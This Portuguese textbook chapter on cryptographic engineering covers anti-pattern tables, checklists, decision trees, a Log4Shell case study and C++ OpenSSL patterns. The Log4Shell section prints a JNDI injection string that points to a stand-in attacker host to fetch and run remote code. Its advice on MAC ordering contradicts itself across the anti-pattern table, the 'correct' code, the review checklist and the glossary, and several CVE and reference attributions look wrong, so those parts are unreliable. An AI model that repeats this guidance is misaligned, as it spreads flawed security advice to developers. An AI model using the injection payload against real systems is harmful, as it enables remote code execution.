---
layout: default
title: "16-boas-praticas-checklist"
---

# Capítulo 16: Boas Práticas e Checklist de Engenharia Criptográfica

> *"O inimigo da segurança não é a ignorância — é a ilusão de conhecimento."*

---

## Objetivos de Aprendizado

1. Identificar e evitar 20+ anti-padrões em implementações criptográficas
2. Aplicar checklists de seleção de algoritmo, implementação, key management e compliance
3. Usar decision trees para escolhas de algoritmos e bibliotecas
4. Revisar código criptográfico com uma checklist estruturada
5. Planejar migrações de crypto legacy para padrões modernos

---

## 16.1 Anti-Padrões em Criptografia

### 16.1.1 Geração e Gestão de Chaves

| # | Anti-Pattern | Consequência | CVE | Correção |
|---|-------------|--------------|-----|----------|
| 1 | Usar rand() do C | Chaves previsíveis | CVE-2008-0166 | RAND_bytes() ou getrandom() |
| 2 | Hardcoded keys no código | Comprometimento total | — | Vault, HSM, env vars |
| 3 | Sem KDF para passwords | Brute-force trivial | — | Argon2id, scrypt, PBKDF2 |
| 4 | Mesma chave para encrypt e auth | Cross-protocol attacks | — | HKDF para derivação |
| 5 | Nonce reuse com AEAD | Recover plaintext | CVE-2016-10199 | Counter ou CSPRNG random |

```cpp
// ERRADO: rand() para gerar chave
uint8_t key[32];
for (int i = 0; i < 32; i++) key[i] = rand() % 256;  // NUNCA

// CORRETO: CSPRNG
uint8_t key[32];
if (RAND_bytes(key, 32) != 1) {
    throw std::runtime_error("Falha ao gerar chave");
}
```

### 16.1.2 Implementação

| # | Anti-Pattern | Consequência | CVE | Correção |
|---|-------------|--------------|-----|----------|
| 6 | ECB mode | Leakage de padrões | — | GCM ou CBC+HMAC |
| 7 | Sem authenticated encryption | Bit-flipping, padding oracle | Lucky13 | AES-GCM, ChaCha20-Poly1305 |
| 8 | Ignorar retornos de erro | Falhas silenciosas | CVE-2014-0160 | Verificar sempre |
| 9 | Verificar MAC depois de decrypt | Padding oracle | CVE-2011-3389 | Decrypt-then-verify |
| 10 | Comparação de MAC com == | Timing attack | — | CRYPTO_memcmp() |

```cpp
// ERRADO: Verificar MAC depois de decrypt
EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ct_len);
EVP_DecryptFinal_ex(ctx, plaintext + len, &len);

// CORRETO: Decrypt-then-MAC com verificação constante
EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ct_len);
EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
unsigned char mac[32];
EVP_DigestSignFinal(sign_ctx, mac, &mac_len);
if (CRYPTO_memcmp(mac, expected_mac, 32) != 0) {
    OPENSSL_cleanse(plaintext, pt_len);
    return ERROR;
}
```

### 16.1.3 TLS e Rede

| # | Anti-Pattern | Consequência | CVE | Correção |
|---|-------------|--------------|-----|----------|
| 11 | TLS 1.0/1.1 | Protocolos degradados | POODLE | TLS 1.3 mínimo |
| 12 | Verificação de cert desabilitada | MITM trivial | — | Sempre verificar CA |
| 13 | Sem OCSP stapling | Revogação não verificada | — | Habilitar OCSP |
| 14 | Cipher suites fracas | Downgrade attack | FREAK | ECDHE+AESGCM/CHACHA20 |
| 15 | Sem forward secrecy | Key compromise retroativo | — | ECDHE obrigatório |

```cpp
// ERRADO: TLS com cipher suites fracas
SSL_CTX_set_cipher_list(ctx, "ALL");

// CORRETO: TLS 1.3 seguro
SSL_CTX_set_min_proto_version(ctx, TLS1_3_VERSION);
SSL_CTX_set_cipher_list(ctx, "TLS_AES_256_GCM_SHA384:"
                              "TLS_CHACHA20_POLY1305_SHA256");
```

### 16.1.4 Side-Channels

| # | Anti-Pattern | Consequência | CVE | Correção |
|---|-------------|--------------|-----|----------|
| 16 | Comparação com == | Timing attack | CVE-2019-1547 | CRYPTO_memcmp() |
| 17 | Branch baseado em secret | Control-flow leak | Minerva | Constant-time select |
| 18 | Secret-dependent memory access | Cache-timing | Spectre | Constant-time indexing |
| 19 | Sem memory wipe | Residual em memória | Heartbleed | OPENSSL_cleanse() |
| 20 | memset para limpar memória | Compiler removes it | CVE-2014-0160 | OPENSSL_cleanse() |

### 16.1.5 Criptografia Pós-Quântica

| # | Anti-Pattern | Consequência | Correção |
|---|-------------|------------|----------|
| 21 | Usar apenas RSA 2048 | Vulnerável a quantum | Hybrid X25519+ML-KEM |
| 22 | Não inventariar algoritmos | Surpresas na migração | Inventario completo |
| 23 | ECDH sem hybrid PQC | Harvest-now-decrypt-later | ML-KEM em paralelo |

---

## 16.2 Decision Trees

### 16.2.1 Qual Algoritmo de Encryption?

```
Necessidade de Authenticated Encryption?
├── Sim
│   ├── Dados > 16KB?
│   │   ├── Sim → ChaCha20-Poly1305
│   │   └── Não → AES-256-GCM
│   └── Precisa de nonce-misuse resistance?
│       ├── Sim → AES-256-GCM-SIV
│       └── Não → AES-256-GCM ou ChaCha20-Poly1305
├── Não
│   ├── Confidencialidade apenas → AES-256-CTR + HMAC-SHA256
│   └── Integridade apenas → HMAC-SHA256 ou SHA-3
```

### 16.2.2 Qual Biblioteca?

```
Projeto já usa OpenSSL?
├── Sim → OpenSSL 3.x com providers
├── Não
│   ├── Facilidade de uso?
│   │   ├── Sim → libsodium
│   │   └── Não
│   │       ├── TLS/DTLS necessário?
│   │       │   ├── Sim → OpenSSL ou BoringSSL
│   │       │   └── Não
│   │       │       ├── PQC necessário?
│   │       │       │   ├── Sim → liboqs (+ libsodium para clássico)
│   │       │       │   └── Não
│   │       │       │       ├── C++ puro?
│   │       │       │       │   ├── Sim → Botan
│   │       │       │       │   └── Não → libsodium
```

### 16.2.3 Key Management

```
Chave em produção?
├── Sim
│   ├── Dados sensíveis?
│   │   ├── Sim → HSM ou Cloud KMS
│   │   └── Não → Vault ou software KMS
│   └── Rotation → Key wrapping com master key rotativa
├── Não (dev/teste)
│   └── .env ou secrets manager, NUNCA hardcoded
```

---

## 16.3 Checklists de Segurança

### 16.3.1 Seleção de Algoritmo

- [ ] Algoritmo está em standard (NIST, IETF, ISO)?
- [ ] Suportado por 2+ bibliotecas maduras?
- [ ] Análise de segurança publicada e revisada?
- [ ] Não foi deprecated?
- [ ] Adequado para o caso de uso?
- [ ] Suporta authenticated encryption?
- [ ] É constant-time em pelo menos 1 implementação?
- [ ] Hardware acceleration disponível no target?

### 16.3.2 Implementação Segura

- [ ] Usar biblioteca madura (não implementar do zero)
- [ ] Verificar TODOS os retornos de função
- [ ] Usar authenticated encryption
- [ ] Constant-time para operações com secrets
- [ ] Limpar memória sensível após uso (OPENSSL_cleanse)
- [ ] Nonce/IV único por encrypt com mesma chave
- [ ] KDF para passwords (Argon2id)
- [ ] Chaves armazenadas separadamente dos dados
- [ ] HKDF para derivação de chaves de uso específico
- [ ] Input validation antes de operações criptográficas

### 16.3.3 Key Management

- [ ] Chaves geradas com CSPRNG
- [ ] Tamanho adequado (AES-256, RSA-3072+, ECC P-256+)
- [ ] Armazenadas em HSM/Vault/KMS
- [ ] Key rotation implementado e documentado
- [ ] Key backup testado
- [ ] Key revocation em < 1 hora
- [ ] Chaves descontinuadas destruídas seguramente
- [ ] Acesso logado e auditado
- [ ] Separação de duties (quem gera ≠ quem usa)

### 16.3.4 TLS/HTTPS

- [ ] TLS 1.3 preferido (mínimo TLS 1.2)
- [ ] Cipher suites: ECDHE+AESGCM ou CHACHA20-POLY1305
- [ ] Certificado válido e de CA confiável
- [ ] OCSP stapling habilitado
- [ ] HSTS com max-age >= 1 ano
- [ ] Certificate Transparency habilitado
- [ ] Server key >= 2048-bit RSA ou 256-bit ECC
- [ ] Forward secrecy obrigatório

### 16.3.5 Compliance

- [ ] FIPS 140-3 (se aplicável): módulo validado
- [ ] LGPD/GDPR: criptografia documentada como medida de proteção
- [ ] PCI DSS: dados de pagamento encriptados em repouso e trânsito
- [ ] HIPAA: dados de saúde protegidos
- [ ] ICP-Brasil: certificados conforme norma
- [ ] Inventario de algoritmos mantido atualizado
- [ ] Processo de migração PQC documentado

### 16.3.6 Testing

- [ ] KAT para todos os algoritmos
- [ ] Differential testing entre bibliotecas
- [ ] Fuzzing com libFuzzer ou AFL++
- [ ] Constant-time verification com Valgrind
- [ ] Memory safety com ASan/MSan
- [ ] Property-based tests para invariantes críticas
- [ ] Reproducible builds verificados
- [ ] Performance regression tests

### 16.3.7 Deployment

- [ ] TLS configurado e testado com sslyze/testssl.sh
- [ ] Certificados com validade <= 90 dias
- [ ] Key rotation automatizado
- [ ] Monitoring de cert expiry
- [ ] Backup de chaves testado
- [ ] Incident response runbook documentado
- [ ] Logs de operações crypto (sem expor secrets)

---

## 16.4 Code Review Checklist (30+ Items)

| # | Item | Criticidade |
|---|------|-------------|
| 1 | Sem rand()/random() para geração de chaves | CRÍTICO |
| 2 | Sem chaves hardcoded | CRÍTICO |
| 3 | Todos retornos de EVP_* verificados | CRÍTICO |
| 4 | Authenticated encryption utilizado | CRÍTICO |
| 5 | MAC verificado ANTES de decrypt | CRÍTICO |
| 6 | Comparação de MAC usa CRYPTO_memcmp | ALTO |
| 7 | Memória sensível limpa com OPENSSL_cleanse | ALTO |
| 8 | Nonce/IV único por encrypt | ALTO |
| 9 | KDF usado para passwords | ALTO |
| 10 | TLS 1.3 ou 1.2 com cipher suites seguros | ALTO |
| 11 | Certificados verificados | ALTO |
| 12 | Error messages não vaziam detalhes internos | MÉDIO |
| 13 | Secrets não aparecem em logs | ALTO |
| 14 | Constant-time para comparações secretas | ALTO |
| 15 | HKDF para derivação de chaves | MÉDIO |
| 16 | Key rotation implementado | MÉDIO |
| 17 | Input validation antes de parsing | ALTO |
| 18 | Sem debug code em produção | MÉDIO |
| 19 | Sanitizer builds passam | ALTO |
| 20 | Valgrind sem conditional jumps em crypto | ALTO |
| 21 | Fuzzing sem crashes | ALTO |
| 22 | Reproducible build habilitado | MÉDIO |
| 23 | FIPS mode configurado (se requerido) | CRÍTICO |
| 24 | Library versions atualizadas | ALTO |
| 25 | CVE scan sem dependências vulneráveis | ALTO |
| 26 | Constant-time não otimizado away pelo compiler | ALTO |
| 27 | Zeroization volatile/immune a otimização | ALTO |
| 28 | RNG usa OS CSPRNG | CRÍTICO |
| 29 | Thread safety em operações compartilhadas | MÉDIO |
| 30 | Documentação de algoritmos e parâmetros | MÉDIO |
| 31 | SBOM (Software Bill of Materials) mantido | ALTO |
| 32 | Cryptographic agility implementada | MÉDIO |

---

## 16.5 CVE-2021-44228 (Log4Shell): Estudo de Caso

### 16.5.1 O Que Aconteceu

Log4Shell foi uma vulnerabilidade RCE no Apache Log4j que afetou milhões de sistemas. Embora não seja criptográfica, ilustra lições cruciais.

### 16.5.2 Mecanismo

```java
// Vulnerável: Log4j 2.x < 2.15.0
logger.error("User input: ${jndi:ldap://attacker.com/exploit}");
// Log4j resolve JNDI → conecta ao atacante → executa código remoto
```

### 16.5.3 Lições para Criptografia

1. **SBOM**: Rastrear todas as dependências em bibliotecas crypto
2. **CVE scanning automatizado**: osv-scanner, safety, npm audit em CI/CD
3. **Least privilege em logging**: Nunca logar dados sensíveis
4. **Minimal attack surface**: Desabilitar features desnecessárias

### 16.5.4 Prevenção em CI/CD

```yaml
# .github/workflows/cve-scan.yml
- name: CVE Scan
  run: |
    osv-scanner --lockfile go.sum
    osv-scanner --lockfile package-lock.json
    trivy image myapp:latest --severity HIGH,CRITICAL
    syft . -o spdx-json > sbom.json
```

---

## 16.6 Migration Checklist: Legacy para Crypto Moderno

| Fase | Atividade | Ferramenta |
|------|-----------|------------|
| 1. Inventário | Mapear todos algoritmos e chaves em uso | Script custom |
| 2. Classificar | Risco por tipo de dado e vida útil | Risk matrix |
| 3. Priorizar | Dados sensíveis de longa vida primeiro | Classificação |
| 4. Projetar | Hybrid schemes (clássico + PQC) | Design review |
| 5. Implementar | Adicionar PQC ao lado do atual | liboqs + OpenSSL |
| 6. Testar | KAT, differential, benchmarks | CI/CD pipeline |
| 7. Deploy | Feature flags para rollout gradual | LaunchDarkly |
| 8. Monitorar | Performance, errors, compatibilidade | Prometheus |
| 9. Cortar | Remover algoritmo legacy após validação | Deprecation policy |

### Exemplo: Migração RSA → Ed25519 + ML-DSA

```cpp
// ANTES: RSA
EVP_DigestSignInit(ctx, nullptr, EVP_sha256(), nullptr, EVP_rsa_pss(key));
EVP_DigestSignUpdate(ctx, data, data_len);
EVP_DigestSignFinal(ctx, signature, &sig_len);

// DEPOIS: Hybrid Ed25519 + ML-DSA
// Classic
EVP_DigestSignInit(ctx1, nullptr, nullptr, nullptr, EVP_ed25519());
EVP_DigestSignUpdate(ctx1, data, data_len);
EVP_DigestSignFinal(ctx1, sig_classic, &sig1_len);

// Post-quantum
OQS_SIG *oqs = OQS_SIG_new(OQS_SIG_alg_ml_dsa_65);
OQS_SIG_sign(oqs, sig_pq, &sig2_len, data, data_len, sk);

// Combinar
HybridSignature combined = {{sig_classic, sig1_len}, {sig_pq, sig2_len}};
```

---

## 16.7 Referências Rápidas

### Algoritmos por Caso de Uso

| Caso | Algoritmo | Tamanho | Notas |
|------|-----------|---------|-------|
| AEAD | AES-256-GCM | 256 bits | Hardware accel |
| AEAD software | ChaCha20-Poly1305 | 256 bits | Sem HW AES |
| Key exchange | X25519 | 256 bits | ECDHE TLS |
| Signature | Ed25519 | 512 bits | Rápida |
| Password hash | Argon2id | N/A | 64MB+ RAM |
| KDF | HKDF-SHA256 | 256 bits | Derivação |
| Hash | SHA-256/SHA-3 | N/A | SHA-3 anti-length-ext |
| PQC encryption | ML-KEM-768 | 1184 B | NIST std |
| PQC signature | ML-DSA-65 | 1952 B | NIST std |

### Tamanhos de Chave (2025)

| Algoritmo | Mínimo | Recomendado | Quantum-Safe |
|-----------|--------|-------------|-------------|
| RSA | 2048 bits | 3072+ | Não |
| ECDSA/Ed25519 | P-256 | P-384/Ed448 | Não |
| AES | 128 bits | 256 bits | Sim |
| ML-KEM | ML-KEM-512 | ML-KEM-768 | Sim |
| ML-DSA | ML-DSA-44 | ML-DSA-65 | Sim |

---

## 16.8 Exercícios

### Exercício 1: Code Review
Identifique todos os anti-patterns em código vulnerável usando a checklist deste capítulo.

### Exercício 2: Decision Tree
Crie uma decision tree para seleção de password hasher (bcrypt vs scrypt vs Argon2).

### Exercício 3: Migration Plan
Plano de migração: RSA-1024 + AES-128-CBC → RSA-3072+ML-KEM + AES-256-GCM.

### Exercício 4: Compliance Matrix
Matriz: FIPS 140-3 × LGPD × PCI DSS × algoritmos permitidos.

### Exercício 5: Automated Checker
Script C++ que detecta anti-patterns: rand(), == em MACs, memset para secrets.

### Exercício 6: TLS Audit
Audite TLS de um servidor público com testssl.sh. Documente e corrija.

---

## 16.9 Referências

1. NIST SP 800-57: Key Management
2. NIST SP 800-52 Rev 2: TLS Implementations
3. OWASP Cheat Sheet Series: https://cheatsheetseries.owasp.org/
4. RFC 8446: TLS 1.3
5. RFC 7748: X25519/X448
6. RFC 8032: Ed25519
7. LGPD (Lei 13.709/2018)
8. GDPR Article 32
9. PCI DSS v4.0
10. FIPS 140-3
11. CVE-2021-44228 (Log4Shell)
12. Google Wycheproof
13. Mozilla SSL Configuration Generator
14. Bernstein (2005) Cache-timing attacks on AES
15. Brumley & Boneh (2003) Remote timing attacks

---

## 16.8 Casos de Estudo: Erros e Correções

### Caso 1: Padding Oracle em Implementação TLS

Um servidor web usava OpenSSL com padding check antes de MAC verification:

```cpp
// VULNERÁVEL: Padding check antes de MAC
int ret = EVP_DecryptFinal_ex(ctx, out, &outlen);
if (ret <= 0) {
    return ERR_BAD_PADDING;  // Timing oracle!
}
// MAC verification depois
```

Timing diferente para padding válido vs inválido permite ao atacante recuperar plaintext byte a byte.

**Correção:** Verificar MAC em ciphertext (antes de decrypt), e usar encrypt-then-MAC.

### Caso 2: Nonce Reuse em AES-GCM

Um sistema IoT reusou o mesmo nonce para mensagens diferentes com a mesma chave:

```cpp
// VULNERÁVEL: Nonce fixo
uint8_t nonce[12] = {0};  // NUNCA reutilizar!
```

Com nonce reutilizado em GCM: `C1 XOR C2 = P1 XOR P2` — atacante pode recuperar ambos os plaintexts.

**Correção:** Counter-based nonce (incrementar a cada mensagem) ou random nonce com verificação de uniqueness.

### Caso 3: Key Derivation de Password sem Salt

```cpp
// VULNERÁVEL: SHA-256(password) sem salt
SHA256(password, password_len, derived_key, nullptr);
// Rainbow tables, brute-force trivial
```

**Correção:**
```cpp
// CORRETO: Argon2id com salt único
uint8_t salt[16];
RAND_bytes(salt, 16);
argon2id_hash_raw(
    3,           // iterations
    1 << 16,    // 64MB memory
    4,           // parallelism
    password, password_len,
    salt, 16,
    derived_key, 32
);
```

### Caso 4: Verificação de Certificado Desabilitada

```cpp
// VULNERÁVEL: Desabilita verificação (comum em desenvolvimento)
SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);
// Transportado para produção — MITM trivial
```

**Correção:** Em desenvolvimento, usar certificados auto-assinados com CA própria, mas SEMPRE com verificação habilitada.

---

## 16.9 Tabela de Algoritmos Recomendados por Versão de Biblioteca

| Biblioteca | Versão Atual | AEAD | Assinatura | Key Exchange | PQC |
|------------|-------------|------|------------|-------------|-----|
| OpenSSL | 3.3.x | AES-GCM, ChaCha20 | Ed25519, ECDSA, RSA | X25519, ECDH | liboqs provider |
| libsodium | 1.0.20 | ChaCha20-Poly1305, AES-GCM | Ed25519, Ed448 | X25519, X448 | Não nativo |
| BoringSSL | latest | AES-GCM, ChaCha20 | Ed25519, ECDSA | X25519 | Em progresso |
| Botan | 3.x | AES-GCM, ChaCha20 | Ed25519, ECDSA | X25519 | Em progresso |
| liboqs | 0.12.x | ML-KEM | ML-DSA, SLH-DSA | ML-KEM | Nativo |

---

## 16.10 Quick Reference: Error Messages

Nunca exponha detalhes internos em error messages de crypto:

```cpp
// ERRADO
throw std::runtime_error("Decryption failed: invalid padding at offset 42");
// Revela: padding válido/inválido (oracle), offset (estrutura)

// ERRADO
throw std::runtime_error("Certificate verification failed: self-signed CA 'Root CA'");
// Revela: existência de CA, tipo de falha

// CORRETO
throw std::runtime_error("Decryption failed");
// ou
LOG_ERROR("Crypto operation failed");
// Logar detalhes internos separadamente, com acesso restrito
```

---

## 16.11 Glossário de Anti-Padrões

| Termo | Definição | Alternativa |
|-------|-----------|-------------|
| ECB mode | Sem IV, padrões visíveis | CBC/GCM/CTR |
| CBC sem MAC | Vulnerável a padding oracle | Encrypt-then-MAC, GCM |
| Nonce reuse | Mesmo nonce + mesma chave | Counter ou random |
| Hardcoded key | Chave no source code | HSM, Vault, env vars |
| Early MAC check | MAC verificada antes de decrypt | MAC no ciphertext |
| Secret-dependent branch | Timing leak | Constant-time select |
| Secret-dependent index | Cache leak | Constant-time array |
| memset for zeroing | Compiler removes it | OPENSSL_cleanse |
| rand() for keys | Predictable | RAND_bytes, getrandom |
| RSA without padding | Inseguro | RSA-OAEP, RSA-PSS |
| MD5/SHA-1 for signatures | Broken collision resistance | SHA-256, SHA-3 |
| 512-bit RSA | Factored easily | RSA-3072+ ou ECC |
| Self-signed certs in prod | MITM | CA-issued certificates |
| Disabled cert verification | MITM trivial | Always verify |
| Logging secrets | Exposure in logs | Redact, structured logging |
| Debug crypto in production | Information leakage | Remove debug code |
| No key rotation | Single point of failure | Automated rotation |
| Symmetric key for signing | No signature possible | Ed25519, ECDSA |
| HMAC with key=0 | Weak authentication | Random key via HKDF |
| TLS 1.0 | Deprecated, vulnerable | TLS 1.3 |

---

## 16.12 Referências Adicionais

16. Bernstein, D.J. (2005). "Cache-timing attacks on AES." 
17. Brumley, B.B., Boneh, D. (2003). "Remote timing attacks are practical."
18. Bleichenbacher, D. (2006). "Chosen-ciphertext attacks against protocols based on the RSA encryption standard PKCS #1."
19. Vaudenay, S. (2002). "Security Flaws Induced by CBC Padding Applications to SSL, IPSEC, W-TLS..."
20. Moeller, B. (2004). "Security of CBC Ciphersuites in SSL/TLS: Practical and Theoretical Attacks."
21. Gligor, V.D., Donescu, P. (1999). "Fast Encryption and Authentication: XCBC Encryption and XECB Authentication Modes."
22. McGrew, D., Viega, J. (2004). "The Galois/Counter Mode of Operation (GCM)."
23. McGrew, D. (2022). "IETF RFC 8452: AES-GCM-SIV."
24. Nir, Y., Langley, A. (2015). "IETF RFC 7539: ChaCha20 and Poly1305 for IETF Protocols."
25. Rescorla, E. (2018). "IETF RFC 8446: The Transport Layer Security (TLS) Protocol Version 1.3."

---

## 16.13 Padrões de Arquitetura para Sistemas Criptográficos

### 16.13.1 Cryptographic Service Layer

Toda aplicação que usa criptografia deveria ter uma camada de abstração:

```cpp
// crypto_service.hpp — Interface de abstração criptográfica
class ICryptoService {
public:
    virtual ~ICryptoService() = default;
    
    // Authenticated encryption
    virtual EncryptedData encrypt(
        std::span<const uint8_t> plaintext,
        std::span<const uint8_t> aad = {}) = 0;
    
    virtual std::vector<uint8_t> decrypt(
        const EncryptedData& data) = 0;
    
    // Digital signatures
    virtual Signature sign(std::span<const uint8_t> data) = 0;
    virtual bool verify(
        std::span<const uint8_t> data,
        const Signature& sig) = 0;
    
    // Key management
    virtual KeyHandle generate_key(KeyType type) = 0;
    virtual void rotate_key(KeyHandle key) = 0;
    virtual void destroy_key(KeyHandle key) = 0;
};

// OpenSSLCryptoService — Implementação concreta
class OpenSSLCryptoService : public ICryptoService {
    std::unique_ptr<IKeyStore> key_store_;
    std::unique_ptr<IHSMConnector> hsm_;
    
public:
    EncryptedData encrypt(
        std::span<const uint8_t> plaintext,
        std::span<const uint8_t> aad
    ) override {
        // 1. Obter chave do key store
        auto key = key_store_->get_current_key(KeyType::ENCRYPTION);
        
        // 2. Gerar nonce aleatório
        EncryptedData result;
        result.nonce.resize(12);
        RAND_bytes(result.nonce.data(), 12);
        
        // 3. Encrypt com AES-256-GCM
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, nullptr);
        EVP_EncryptInit_ex(ctx, nullptr, nullptr, key.data(), result.nonce.data());
        
        if (!aad.empty()) {
            int len;
            EVP_EncryptUpdate(ctx, nullptr, &len, aad.data(), aad.size());
        }
        
        int len;
        result.ciphertext.resize(plaintext.size());
        EVP_EncryptUpdate(ctx, result.ciphertext.data(), &len,
                          plaintext.data(), plaintext.size());
        EVP_EncryptFinal_ex(ctx, result.ciphertext.data() + len, &len);
        
        result.tag.resize(16);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, result.tag.data());
        EVP_CIPHER_CTX_free(ctx);
        
        return result;
    }
    
    // ... other methods
};
```

### 16.13.2 Key Rotation Pattern

```cpp
// key_rotation_manager.hpp
class KeyRotationManager {
    std::shared_ptr<IKeyStore> store_;
    std::chrono::hours rotation_interval_;
    
public:
    void rotation_loop() {
        while (running_) {
            auto current_key = store_->get_current_key(KeyType::ENCRYPTION);
            auto age = current_key.created_at().age();
            
            if (age >= rotation_interval_) {
                // 1. Gerar nova chave
                auto new_key = store_->generate_key(KeyType::ENCRYPTION);
                
                // 2. Re-encrypt dados sensíveis (key wrapping)
                auto wrapped = wrap_all_data_keys(current_key, new_key);
                
                // 3. Ativar nova chave
                store_->activate_key(new_key);
                
                // 4. Verificar que tudo funciona
                auto test_data = encrypt_test(new_key);
                if (!decrypt_test(new_key, test_data)) {
                    store_->rollback();
                    LOG_ERROR("Key rotation test failed");
                    continue;
                }
                
                // 5. Destruir chave antiga (após grace period)
                schedule_destruction(current_key, 
                    std::chrono::hours(24));  // 24h grace period
                
                LOG_INFO("Key rotation completed successfully");
            }
            
            std::this_thread::sleep_for(std::chrono::minutes(5));
        }
    }
};
```

### 16.13.3 Envelope Encryption Pattern

```cpp
// envelope_encryption.hpp
struct EncryptedEnvelope {
    std::vector<uint8_t> encrypted_data_key;  // Key encrypted by master key
    std::vector<uint8_t> iv;
    std::vector<uint8_t> ciphertext;
    std::vector<uint8_t> tag;
    std::string key_id;  // Identifier for master key version
};

EncryptedEnvelope envelope_encrypt(
    const uint8_t* plaintext, size_t pt_len,
    IMasterKeyProvider& master_key_provider
) {
    // 1. Gerar data key efêmera
    uint8_t data_key[32];
    RAND_bytes(data_key, 32);
    
    // 2. Envelope: encrypt data key com master key
    auto master_key = master_key_provider.get_current_key();
    auto encrypted_dk = master_key_provider.wrap_key(data_key, master_key);
    
    // 3. Encrypt dados com data key
    EncryptedEnvelope env;
    env.encrypted_data_key = encrypted_dk;
    env.key_id = master_key_provider.current_key_id();
    env.iv.resize(12);
    RAND_bytes(env.iv.data(), 12);
    
    // AES-256-GCM encrypt com data key
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, nullptr);
    EVP_EncryptInit_ex(ctx, nullptr, nullptr, data_key, env.iv.data());
    
    env.ciphertext.resize(pt_len);
    int len;
    EVP_EncryptUpdate(ctx, env.ciphertext.data(), &len, plaintext, pt_len);
    EVP_EncryptFinal_ex(ctx, env.ciphertext.data() + len, &len);
    
    env.tag.resize(16);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, env.tag.data());
    EVP_CIPHER_CTX_free(ctx);
    
    // 4. Limpar data key
    OPENSSL_cleanse(data_key, 32);
    
    return env;
}
```

### 16.13.4 Secure Logging Pattern

```cpp
// secure_logger.hpp — Nunca logue secrets
class SecureLogger {
    std::ofstream log_file_;
    
public:
    void log_crypto_operation(
        const std::string& op,
        const std::string& key_id,  // ID sim, chave NÃO
        size_t data_size,
        bool success
    ) {
        // Log estruturado SEM dados sensíveis
        json entry;
        entry["timestamp"] = now_iso8601();
        entry["operation"] = op;
        entry["key_id"] = key_id;     // OK: é um identificador
        entry["data_size"] = data_size;  // OK: é metadata
        entry["success"] = success;
        entry["session_id"] = session_id_;
        
        // NUNCA: entry["key"] = key_data;
        // NUNCA: entry["plaintext"] = data;
        // NUNCA: entry["password"] = pw;
        
        log_file_ << entry.dump() << std::endl;
    }
    
    void log_error(const std::string& op, const std::string& error) {
        // Erros NÃO devem expor:
        // - Chaves ou fragments
        // - Endereços de memória
        // - Conteúdo de buffers
        // - Tipos de falha específicos (oracle)
        
        json entry;
        entry["timestamp"] = now_iso8601();
        entry["level"] = "ERROR";
        entry["operation"] = op;
        entry["message"] = "Crypto operation failed";  // Genérico!
        
        log_file_ << entry.dump() << std::endl;
    }
};
```

---

## 16.14 Anti-Patterns de Performance

### 16.14.1 Impacto de Decisões de Crypto na Performance

| Decisão | Impacto | Alternativa |
|---------|---------|-------------|
| AES-256-GCM com HW accel | ~1 cycle/byte | Preferível |
| ChaCha20-Poly1305 sem HW | ~3 cycles/byte | OK para software-only |
| RSA-4096 signing | ~100ms | Ed25519 (~0.5ms) |
| RSA-2048 verification | ~0.5ms | Ed25519 (~0.1ms) |
| PBKDF2 100K iterations | ~500ms | Argon2id (mais resistente) |
| SHA-256 hash 1MB | ~1ms | SHA-3 (similar) |
| ML-KEM-768 encaps | ~0.1ms | OK |
| ML-DSA-65 sign | ~5ms | Aceitável |

### 16.14.2 Benchmarking Crypto Code

```cpp
// benchmark_crypto.cpp
#include <benchmark/benchmark.h>

static void BM_AES256GCM_Encrypt(benchmark::State& state) {
    std::vector<uint8_t> key(32), iv(12), plaintext(state.range(0));
    RAND_bytes(key.data(), 32);
    RAND_bytes(iv.data(), 12);
    RAND_bytes(plaintext.data(), plaintext.size());
    
    for (auto _ : state) {
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, nullptr);
        EVP_EncryptInit_ex(ctx, nullptr, nullptr, key.data(), iv.data());
        
        std::vector<uint8_t> ct(plaintext.size() + 16);
        int len;
        EVP_EncryptUpdate(ctx, ct.data(), &len, plaintext.data(), plaintext.size());
        EVP_EncryptFinal_ex(ctx, ct.data() + len, &len);
        EVP_CIPHER_CTX_free(ctx);
    }
    
    state.SetBytesProcessed(int64_t(state.iterations()) * state.range(0));
}

BENCHMARK(BM_AES256GCM_Encrypt)
    ->Arg(64)->Arg(256)->Arg(1024)->Arg(4096)->Arg(16384)->Arg(65536);

BENCHMARK_MAIN();
```

---

## 16.15 Formatos de Dados Criptográficos

### 16.15.1 Formatos Recomendados para Armazenamento

| Dado | Formato | Exemplo |
|------|---------|---------|
| Password hash | Argon2id + salt + params | `$argon2id$v=19$m=65536,t=3,p=4$salt$hash` |
| Key encrypted | Envelope encryption | `{dk_wrapped, iv, ct, tag, key_id}` |
| Certificate | PEM (text) ou DER (binary) | `-----BEGIN CERTIFICATE-----` |
| Signature | DER encoded | Binary, armazenado separadamente |
| Ciphertext | AEAD bundle | `{iv, ct, tag, key_id, algo}` |
| Token | JWT (signed, not encrypted) | `header.payload.signature` |

### 16.15.2 Serialização Segura

```cpp
// NUNCA serializar chaves em texto plano
// NUNCA serializar passwords
// NUNCA serializar plaintexts para debug

// CORRETO: Serializar ciphertext com metadata
struct CryptoBundle {
    std::string algorithm;    // "AES-256-GCM"
    std::string key_id;       // "key-2025-01"
    std::vector<uint8_t> iv;  // 12 bytes
    std::vector<uint8_t> ct;  // variável
    std::vector<uint8_t> tag; // 16 bytes
    
    // Serialização: JSON ou Protocol Buffers
    std::string serialize() const {
        json j;
        j["alg"] = algorithm;
        j["kid"] = key_id;
        j["iv"] = base64_encode(iv);
        j["ct"] = base64_encode(ct);
        j["tag"] = base64_encode(tag);
        return j.dump();
    }
};
```

---

*[Capítulo 15: Estudo de Caso — TLS Server Seguro em C++](15-estudo-caso-tls-server.md)*
